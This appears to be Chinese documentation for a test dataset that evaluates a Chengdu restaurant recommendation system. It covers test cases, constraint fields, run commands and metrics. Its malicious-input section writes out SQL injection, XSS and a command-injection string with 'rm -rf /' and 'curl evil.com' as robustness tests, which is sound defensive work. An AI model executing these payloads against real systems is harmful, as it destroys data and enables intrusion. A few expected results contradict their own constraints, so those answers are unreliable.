## 1. 概述

本测试集用于稳定评估 FoodAdvisor 探店推荐系统效果。v2.0 基于项目实际的 **24 家成都种子商户** 设计，确保每条案例的测试条件都能在真实数据上得到有意义的验证结果。

### 1.1 种子数据概览

| 维度 | 实际值 |
|------|--------|
| **城市** | 成都市 |
| **城区** | 锦江区、青羊区、武侯区、成华区、金牛区、高新区（每区4家） |
| **菜系** | 川菜（中餐）、火锅（火锅）、粤菜（中餐）、咖啡甜品（休闲餐饮） |
| **价格区间** | 32 ~ 124 元（步长4元递增） |
| **评分区间** | 2.0 ~ 4.0 |
| **营业时间** | 统一 10:00-22:00，全年无休 |
| **环境标签** | 川菜&粤菜 → `["明亮","交通便利"]`；火锅&咖啡甜品 → `["安静","适合聚餐"]` |
| **特殊商户** | DEMO-M-023（武侯粤菜）= SUSPENDED；DEMO-M-024（武侯咖啡甜品）= CLOSED_PERMANENTLY |

### 1.2 文件清单

| 文件 | 用途 |
|------|------|
| `scripts/postgres/seed/recommendation_eval_seed.sql` | 标准测试集种子数据（SQL，推荐使用） |
| `scripts/run_recommendation_eval.py` | 评测管理脚本（Python，也可通过 API 导入） |
| `docs/recommendation-eval-dataset.md` | 本文档 |

## 3. 案例详情

### 3.1 普通问题（12条）— 预期能匹配到商户

#### REC-001: 单人川菜成华区
- **输入**: "我一个人想吃川菜，人均50以内，最好在成华区"
- **期望约束**: cuisines=["川菜"], partySize=1, perCapitaBudget=50, distanceKm=5
- **预期匹配**: DEMO-M-001（成华川菜 32元 3.33分）
- **覆盖维度**: 人数, 菜系, 预算, 城区

#### REC-002: 双人火锅高评分
- **输入**: "两个人想吃火锅，评分要高的，人均不超过80"
- **期望约束**: cuisines=["火锅"], partySize=2, perCapitaBudget=80, minRating=4.0
- **预期匹配**: DEMO-M-010（锦江火锅 68元 4.0分）
- **覆盖维度**: 人数, 菜系, 预算, 评分

#### REC-003: 家庭聚餐粤菜
- **输入**: "一家四口想吃粤菜，人均80到120，适合家庭聚餐的"
- **期望约束**: cuisines=["粤菜"], partySize=4, perCapitaBudget=100, scenes=["家庭聚餐"]
- **预期匹配**: DEMO-M-011（锦江粤菜 72元）, DEMO-M-015（金牛粤菜 88元）, DEMO-M-019（青羊粤菜 104元）
- **覆盖维度**: 人数, 菜系, 预算, 场景

#### REC-004: 朋友下午茶咖啡甜品
- **输入**: "和朋友去喝下午茶，找一家咖啡甜品店，环境安静一点的"
- **期望约束**: cuisines=["咖啡甜品"], partySize=3, environmentRequirements=["安静"], scenes=["朋友聚会"]
- **预期匹配**: 全部6家咖啡甜品（均带"安静"标签）
- **覆盖维度**: 人数, 菜系, 环境, 场景

#### REC-005: 锦江区火锅
- **输入**: "锦江区有什么好吃的火锅店？人均70左右"
- **期望约束**: cuisines=["火锅"], perCapitaBudget=70
- **预期匹配**: DEMO-M-010（锦江火锅 68元 4.0分）
- **覆盖维度**: 菜系, 城区, 预算

#### REC-006: 武侯区中餐高评分
- **输入**: "武侯区附近有什么好的中餐馆？评分3.0以上的"
- **期望约束**: merchantTypes=["中餐"], minRating=3.0
- **预期匹配**: DEMO-M-021（武侯川菜 112元 3.33分），DEMO-M-023 因 SUSPENDED 被过滤
- **覆盖维度**: 品类, 城区, 评分

#### REC-007: 金牛区人均80以内
- **输入**: "金牛区附近，人均不超过80块钱，随便什么菜系都行"
- **期望约束**: perCapitaBudget=80, distanceKm=5
- **预期匹配**: DEMO-M-013（金牛川菜 80元, 恰好满足）, 其余金牛区商户价格84-92超出
- **覆盖维度**: 预算, 城区

#### REC-008: 成华区明亮环境
- **输入**: "成华区有没有环境比较明亮的餐厅？两个人吃"
- **期望约束**: partySize=2, environmentRequirements=["明亮"], distanceKm=5
- **预期匹配**: DEMO-M-001（川菜 明亮）, DEMO-M-003（粤菜 明亮）
- **覆盖维度**: 人数, 城区, 环境

#### REC-009: 青羊区聚餐
- **输入**: "五六个人想在青羊区聚餐，环境要适合聚餐的"
- **期望约束**: partySize=5, environmentRequirements=["适合聚餐"], scenes=["朋友聚会"]
- **预期匹配**: DEMO-M-018（青羊火锅 100元 安静适合聚餐）, DEMO-M-020（青羊咖啡甜品 108元）
- **覆盖维度**: 人数, 城区, 环境, 场景

#### REC-010: 高评分川菜
- **输入**: "想吃评分最高的川菜馆，两个人"
- **期望约束**: cuisines=["川菜"], partySize=2, minRating=3.5
- **预期匹配**: DEMO-M-005（高新川菜 4.0分）, DEMO-M-001（成华川菜 3.33分），DEMO-M-021（武侯川菜 3.33分）
- **覆盖维度**: 人数, 菜系, 评分

#### REC-011: 火锅安静环境
- **输入**: "想吃火锅，环境要安静一点的，三个人，人均100以内"
- **期望约束**: cuisines=["火锅"], partySize=3, perCapitaBudget=100, environmentRequirements=["安静"]
- **预期匹配**: 全部6家火锅（均带"安静"标签），预算过滤后约4-5家
- **覆盖维度**: 人数, 菜系, 预算, 环境

#### REC-012: 高新区中餐
- **输入**: "去高新区办事，附近有什么中餐推荐？一个人吃工作餐，人均60以内"
- **期望约束**: merchantTypes=["中餐"], partySize=1, perCapitaBudget=60
- **预期匹配**: DEMO-M-005（高新川菜 48元 4.0分）, DEMO-M-007（高新粤菜 56元 2.67分）
- **覆盖维度**: 人数, 品类, 预算, 城区

### 3.2 模糊问题（6条）— 测试推理与默认值

| 编号 | 名称 | 输入 | 核心测试点 |
|------|------|------|-----------|
| REC-013 | 随便吃点 | "随便吃点，你推荐一下吧" | 零约束输入，系统应基于热度/评分给出默认推荐 |
| REC-014 | 成都好吃的 | "成都有什么好吃的餐厅推荐吗" | "好吃"→高评分(≥3.5)的映射 |
| REC-015 | 不太贵的 | "想吃不太贵的，两个人" | "不太贵"→人均≤80的量化 |
| REC-016 | 附近有什么 | "我附近有什么好吃的？" | 位置感知+默认距离5km+默认评分≥3.0 |
| REC-017 | 环境好一点 | "有没有环境好一点的餐厅？两三个人" | "环境好"→安静+高评分的综合映射 |
| REC-018 | 适合约会的 | "推荐个适合约会的餐厅，成都市区" | 场景推理：约会→2人+安静+中等消费+较高评分 |

### 3.3 条件冲突（6条）— 条件间存在逻辑矛盾

| 编号 | 名称 | 输入 | 冲突点 | 期望行为 |
|------|------|------|--------|----------|
| REC-019 | 素食火锅 | "想吃素食火锅，两个人" | 火锅以荤菜为主，与素食矛盾 | 识别冲突或推荐素食替代 |
| REC-020 | 安静又热闹 | "想找一家环境既安静又热闹的餐厅" | 安静↔热闹不可兼得 | 识别环境需求矛盾 |
| REC-021 | 火锅不辣 | "想吃火锅但是一点辣都不能吃" | 火锅核心特征是辣 | 识别口味与菜系矛盾 |
| REC-022 | 单人商务宴请 | "我一个人要商务宴请，人均200以上" | 1人↔商务宴请场景矛盾 | 识别人数与场景不匹配 |
| REC-023 | 凌晨吃早餐 | "凌晨2点想吃早餐，有油条豆浆那种" | 凌晨↔早餐时段矛盾 | 识别时间与品类矛盾 |
| REC-024 | 免费高档餐厅 | "有没有免费的高档餐厅，评分还要4.5以上" | 免费↔高档+高评分矛盾 | 识别价格与品质矛盾 |

### 3.5 恶意输入（5条）— 安全与鲁棒性

| 编号 | 名称 | 输入 | 测试点 |
|------|------|------|--------|
| REC-031 | SQL注入 | `川菜; DROP TABLE merchants; --` | 不执行SQL，作为普通文本处理 |
| REC-032 | XSS攻击 | `<script>alert("xss")</script>火锅推荐` | 不执行脚本，提取"火锅"意图 |
| REC-033 | 超长输入 | "我想吃"+"川菜"×100 | 不崩溃不超时 |
| REC-034 | 特殊Unicode | `想吃🍲🌶️ 火锅 ​ 人均80` | 正确处理emoji和零宽字符 |
| REC-035 | 命令注入 | `川菜 $(rm -rf /) 或者 && curl evil.com` | 不执行系统命令，提取"川菜"和"人均50" |

## 4. expected_constraints 字段说明

`expected_constraints` 使用与 `ConstraintState` Java 类一致的字段名，确保评测框架的自动化对比能正常工作：

| 字段 | 类型 | 示例 | 说明 |
|------|------|------|------|
| `cuisines` | `[String]` | `["川菜"]` | 菜系列表 |
| `merchantTypes` | `[String]` | `["中餐"]` | 商家类型 |
| `partySize` | `Integer` | `2` | 用餐人数 |
| `perCapitaBudget` | `BigDecimal` | `80` | 人均预算 |
| `distanceKm` | `BigDecimal` | `5` | 最大距离(km) |
| `minRating` | `BigDecimal` | `4.0` | 最低评分 |
| `scenes` | `[String]` | `["家庭聚餐"]` | 消费场景 |
| `environmentRequirements` | `[String]` | `["安静"]` | 环境要求 |
| `tasteRestrictions` | `[String]` | `["不吃辣"]` | 口味限制 |
| `businessTime` | `String` | `"LATE_NIGHT"` | 营业时间要求 |
| `businessTargetTime` | `String` | `"02:00"` | 目标时间(HH:mm) |

## 5. 使用方法

### 5.1 导入测试集

```bash
# 推荐方式：SQL 种子文件（幂等）
psql -h <host> -U <user> -d <dbname> \
  -f scripts/postgres/seed/recommendation_eval_seed.sql
```

### 5.2 执行评测

```bash
# 命令行
python scripts/run_recommendation_eval.py run --dataset-id 1

# 或直接调 API
curl -X POST http://localhost:8080/api/admin/recommendation-evaluations/datasets/1/runs \
  -H "Content-Type: application/json" -d '{"topK": 10}'
```

### 5.3 查看与对比

```bash
python scripts/run_recommendation_eval.py results --run-id <RUN_ID>
python scripts/run_recommendation_eval.py compare --baseline 1 --candidate 2
python scripts/run_recommendation_eval.py stats --dataset-id 1
python scripts/run_recommendation_eval.py export --run-id <RUN_ID> --output report.json
```

## 6. 评测指标

| 指标 | 说明 |
|------|------|
| `overallConstraintAccuracy` | 总体约束准确率 = 匹配字段数 ÷ 期望字段总数 |
| `exactConstraintMatchCaseCount` | 所有期望字段完全匹配的案例数 |
| `noResultCaseCount` | 无推荐结果的案例数（对于无结果/冲突类案例，此值高是**正常的**） |
| `uniqueMerchantCount` | 推荐涉及的独立商家数 |

### 6.1 按类别期望结果

| 类别 | 期望：有推荐结果 | 期望：无推荐结果 |
|------|:---:|:---:|
| 普通问题 (12条) | ✓ | |
| 模糊问题 (6条) | ✓（可能部分无结果） | |
| 条件冲突 (6条) | | ✓（系统识别冲突后可能返回空） |
| 无结果 (6条) | | ✓ |
| 恶意输入 (5条) | ✓（安全处理后可能正常返回） | |
